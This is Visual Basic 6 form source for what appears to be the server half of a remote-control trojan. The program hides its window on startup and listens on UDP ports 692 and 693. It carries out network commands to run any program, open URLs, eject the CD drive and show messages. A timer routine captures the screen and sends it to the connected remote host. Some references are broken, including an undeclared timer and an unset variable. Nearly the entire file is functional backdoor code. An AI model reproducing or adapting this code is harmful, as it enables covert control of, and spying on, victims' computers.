VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BackColor       =   &H00000000&
   Caption         =   "Form1"
   ClientHeight    =   4035
   ClientLeft      =   165
   ClientTop       =   915
   ClientWidth     =   5115
   Icon            =   "Form1.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   4035
   ScaleWidth      =   5115
   StartUpPosition =   3  'Windows Default
   Begin VB.Frame Frame1 
      BackColor       =   &H00800000&
      Caption         =   "Current People Connected"
      ForeColor       =   &H00FF0000&
      Height          =   3615
      Left            =   2400
      TabIndex        =   1
      Top             =   120
      Width           =   2535
      Begin VB.ListBox List1 
         BackColor       =   &H00808080&
         Height          =   3180
         Left            =   120
         TabIndex        =   2
         Top             =   240
         Width           =   2295
      End
   End
   Begin VB.PictureBox Picture1 
      AutoSize        =   -1  'True
      Height          =   1095
      Left            =   4320
      ScaleHeight     =   1035
      ScaleWidth      =   1515
      TabIndex        =   0
      Top             =   4320
      Visible         =   0   'False
      Width           =   1575
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   3480
      Top             =   3720
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin MSWinsockLib.Winsock Winsock2 
      Left            =   2160
      Top             =   3840
      _ExtentX        =   741
      _ExtentY        =   741
   End
   Begin VB.Label Label1 
      Caption         =   $"Form1.frx":08CA
      Height          =   3495
      Left            =   120
      TabIndex        =   3
      Top             =   240
      Width           =   2175
   End
   Begin VB.Menu message 
      Caption         =   "&Message"
      Begin VB.Menu sendmessage 
         Caption         =   "&Send a message to selected user"
      End
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False

Private Declare Function ShellExecute Lib "shell32.dll" Alias _
    "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As _
    String, ByVal lpFile As String, ByVal lpParameters As String, _
    ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private Sub Form_Load()
   With Winsock2
     .Protocol = sckUDPProtocol
     .LocalPort = 693
     .Bind
    End With
    With Winsock1
     .Protocol = sckUDPProtocol
     .LocalPort = 692
     .Bind
    End With
    m = Winsock1.LocalIP
 Me.Visible = False
End Sub

Private Sub Timer1_Timer()
GetWindowSnapShot 0, Picture1
Winsock1.RemoteHost = Winsock1.RemoteHostIP
Winsock1.SendData Picture1.Picture
End Sub

Private Sub List1_DblClick()
Winsock1.Close
List1.Clear
End Sub

Private Sub List1_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
If Button = 2 Then
PopupMenu message
End If
End Sub

Private Sub sendmessage_Click()
If List1.Text <> "" Then
ip = List1.Text
Form2.Show
End If
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
Dim data As String
Winsock1.RemoteHost = Winsock1.RemoteHostIP
On Error GoTo err
    Winsock1.GetData data


    Select Case data
    Case "Connect"
        List1.AddItem Winsock1.RemoteHostIP
        Winsock1.SendData "Remote computer connected to server"
    Case "Open Cdrom"
        CDOpen
        Winsock1.SendData Winsock1.LocalIP & " Opened the cdrom"
    Case "Close Cdrom"
        CDClose
        Winsock1.SendData Winsock1.LocalIP & " Closed the cdrom"
  
    End Select
    
  Select Case Left(data, 3)
  Case "Web"
    ms = Right(data, Len(data) - 4)
    ret& = ShellExecute(Me.hWnd, "Open", ms, "", App.Path, 1)
    Winsock1.SendData Winsock1.LocalIP & " Opened a website"
  Case "Ope"
    ms = Right(data, Len(data) - 4)
    X = Shell(ms, vbNormalFocus)
    

    Case "Mes"
    ms = Right(data, Len(data) - 4)
    MsgBox ms
    Winsock1.SendData "Loop Recieved, and being displayed"
    End Select
err:
    Exit Sub
End Sub

Private Sub Winsock2_DataArrival(ByVal bytesTotal As Long)

Select Case Left(data, 3)
Case "Meg"

    ms = Right(data, Len(data) - 4)
    If Form3.Visible = False Then
    Form3.Text1.Text = ""
    Form3.Text1.SelText = ms
    Form3.Show
    End If
    End Select
End Sub

